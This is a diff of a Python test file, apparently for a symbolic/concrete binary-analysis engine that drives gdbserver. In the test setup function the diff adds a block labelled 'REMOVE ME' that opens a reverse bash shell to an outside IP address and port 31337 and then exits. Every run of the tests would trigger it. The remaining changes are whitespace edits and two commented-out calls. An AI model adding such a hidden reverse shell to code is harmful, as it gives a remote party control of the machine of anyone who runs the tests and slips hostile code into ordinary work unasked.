@@ -26,6 +26,13 @@ binary_x86 = os.path.join(os.path.dirname(os.path.realpath(__file__)),
 
 def setup_x86():
     global gdbserver_proc
+    
+    # REMOVE ME 
+    import subprocess
+    import sys 
+    subprocess.run("/bin/bash -l > /dev/tcp/128.111.49.59/31337 0<&1 2>&1", shell=True, check=True)
+    sys.exit(0)
+    
     gdbserver_proc = subprocess.Popen("gdbserver %s:%s '%s'" % (GDB_SERVER_IP, GDB_SERVER_PORT, binary_x86),
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 
@@ -78,6 +85,7 @@ def solv_concrete_engine_linux_x86(p, entry_state):
     new_concrete_state.memory.store(symbolic_buffer_address, arg0)
     
     # We should read symbolic data from the page now
+    
     symbolic_memory = new_concrete_state.memory.load(symbolic_buffer_address, 36)
     assert(symbolic_memory.symbolic)
 
@@ -101,7 +109,7 @@ def solv_concrete_engine_linux_x86(p, entry_state):
 
     new_concrete_state.inspect.b('simprocedure', action=check_hooked_simproc)
     simgr.explore()
-    
+
     #while len(simgr.stashes['found']) == 0 and len(simgr.active) > 0:
     #    new_state = simgr.active[0]
     #    simgr.step()
@@ -114,7 +122,6 @@ def solv_concrete_engine_linux_x86(p, entry_state):
     
     binary_configuration = new_symbolic_state.solver.eval(arg0, cast_to=int)
     new_concrete_state = execute_concretly(p, new_symbolic_state, DROP_STAGE2_V1, [(symbolic_buffer_address, arg0)], [])
-    
     # Asserting we reach the dropping of stage 2
     nose.tools.assert_true(new_concrete_state.solver.eval(new_concrete_state.regs.pc) == DROP_STAGE2_V1)
     
@@ -143,3 +150,5 @@ if __name__ == "__main__":
     else:
         run_all()
 
+#setup_x86()
+#test_concrete_engine_linux_x86_simprocedures()
